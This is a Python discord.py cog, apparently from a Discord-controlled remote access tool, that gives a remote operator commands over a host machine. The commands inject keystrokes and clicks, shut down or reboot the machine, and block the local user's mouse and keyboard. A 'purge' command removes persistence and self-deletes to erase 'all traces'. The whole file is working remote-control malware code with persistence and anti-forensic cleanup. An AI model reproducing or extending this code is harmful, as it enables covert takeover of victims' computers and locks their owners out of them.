import os
import sys
import subprocess
import discord
from discord.ext import commands
import pyautogui
import ctypes
import threading
import time
from src.client.core.platform import Platform
from src.client.core.persistence import Persistence

class Control(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.blocking = False
        # Disable PyAutoGUI's failsafe
        pyautogui.FAILSAFE = False

    @commands.command(name="press", help="Press a key (e.g., 'enter', 'tab', 'a').")
    async def press_key(self, ctx, key):
        try:
            pyautogui.press(key)
            await ctx.send(f"✅ Pressed key: `{key}`")
        except Exception as e:
            await ctx.send(f"❌ Error pressing key: {str(e)}")

    @commands.command(name="type", help="Type text on the remote machine.")
    async def type_text(self, ctx, *, text):
        try:
            pyautogui.write(text, interval=0.01)
            await ctx.send(f"✅ Typed text: `{text[:20]}...`")
        except Exception as e:
            await ctx.send(f"❌ Error typing: {str(e)}")

    @commands.command(name="hotkey", help="Press a hotkey (e.g., 'ctrl+c', 'win+r').")
    async def hotkey(self, ctx, *keys):
        try:
            pyautogui.hotkey(*keys)
            await ctx.send(f"✅ Pressed hotkey: `{' + '.join(keys)}`")
        except Exception as e:
            await ctx.send(f"❌ Error pressing hotkey: {str(e)}")

    @commands.command(name="click", help="Click at specific coordinates (x, y).")
    async def click(self, ctx, x: int, y: int):
        try:
            pyautogui.click(x, y)
            await ctx.send(f"✅ Clicked at `{x}, {y}`")
        except Exception as e:
            await ctx.send(f"❌ Error clicking: {str(e)}")

    @commands.command(name="shutdown", help="Shutdown the remote machine.")
    async def shutdown(self, ctx, reason: str = "System Maintenance"):
        try:
            if Platform.is_windows():
                os.system(f'shutdown /s /t 10 /c "{reason}"')
            else:
                os.system("shutdown now")
            await ctx.send(f"⚠️ Shutdown initiated: `{reason}`")
        except Exception as e:
            await ctx.send(f"❌ Shutdown Error: {str(e)}")

    @commands.command(name="reboot", help="Reboot the remote machine.")
    async def reboot(self, ctx):
        try:
            if Platform.is_windows():
                os.system("shutdown /r /t 10")
            else:
                os.system("reboot")
            await ctx.send("⚠️ Reboot initiated.")
        except Exception as e:
            await ctx.send(f"❌ Reboot Error: {str(e)}")

    @commands.command(name="block", help="Block mouse and keyboard (Windows Admin only).")
    async def block(self, ctx):
        if not Platform.is_windows():
            await ctx.send("❌ Blocking input is currently only supported on Windows.")
            return

        try:
            # We need admin for BlockInput
            self.blocking = True
            def block_thread():
                while self.blocking:
                    ctypes.windll.user32.BlockInput(True)
            
            threading.Thread(target=block_thread, daemon=True).start()
            await ctx.send("🔒 Mouse and keyboard BLOCKED.")
        except Exception as e:
            await ctx.send(f"❌ Block Error: {str(e)}")

    @commands.command(name="unblock", help="Unblock mouse and keyboard.")
    async def unblock(self, ctx):
        if Platform.is_windows():
            self.blocking = False
            ctypes.windll.user32.BlockInput(False)
            await ctx.send("🔓 Mouse and keyboard UNBLOCKED.")
        else:
            await ctx.send("❌ Not supported on this platform.")

    @commands.command(name="endsession", aliases=["exit", "quit"], help="Cleanly close the bot on the host.")
    async def end_session(self, ctx):
        await ctx.send("⚓ **Session Ending.** Goodbye.")
        await self.bot.close()
        sys.exit(0)

    @commands.command(name="restart", help="Restart the bot process.")
    async def restart_bot(self, ctx):
        await ctx.send("🔄 **Restarting bot...**")
        try:
            # Prepare arguments for restart
            if getattr(sys, 'frozen', False):
                # If frozen (PyInstaller), sys.executable is the EXE
                # sys.argv[0] is also the EXE.
                args = [sys.executable] + sys.argv[1:]
            else:
                # If script, sys.executable is python, sys.argv[0] is the script
                args = [sys.executable] + sys.argv

            self.bot.logger.info(f"Restarting with args: {args}")
            
            # Close the bot first
            await self.bot.close()
            
            # Replace current process
            os.execv(sys.executable, args)
        except Exception as e:
            # This might not reach Discord if the bot is already closing
            print(f"❌ Restart failed: {e}")
            try:
                await ctx.send(f"❌ Restart failed: {e}")
            except:
                pass
            sys.exit(1)

    @commands.command(name="purge", help="EMERGENCY: Uninstall persistence and delete ALL bot files.")
    async def purge(self, ctx):
        await ctx.send("🧨 **PURGE INITIATED.** Removing all traces and self-destructing...")
        
        try:
            # 1. Uninstall persistence
            Persistence.uninstall()
            
            # 2. Identify files to delete
            current_exe = sys.executable
            
            # 3. Create self-deletion script
            if Platform.is_windows():
                # Windows needs a bat file to delete the running EXE
                bat_path = os.path.join(os.environ["TEMP"], "purge.bat")
                with open(bat_path, "w") as f:
                    f.write(f'@echo off\n')
                    f.write(f'timeout /t 5 /nobreak > nul\n') # Wait for bot to exit
                    f.write(f'del /f /q "{current_exe}"\n')
                    f.write(f'del "%~f0"\n') # Delete this bat file
                subprocess.Popen(["cmd.exe", "/c", bat_path], shell=True)
            else:
                # Linux can often delete its own binary while running or use a simple shell one-liner
                cmd = f'sleep 5 && rm -f "{current_exe}"'
                subprocess.Popen(cmd, shell=True)

            await ctx.send("✅ Purge complete. Bot is exiting.")
            await self.bot.close()
            sys.exit(0)
            
        except Exception as e:
            await ctx.send(f"❌ Purge Error: {e}")

async def setup(bot):
    await bot.add_cog(Control(bot))
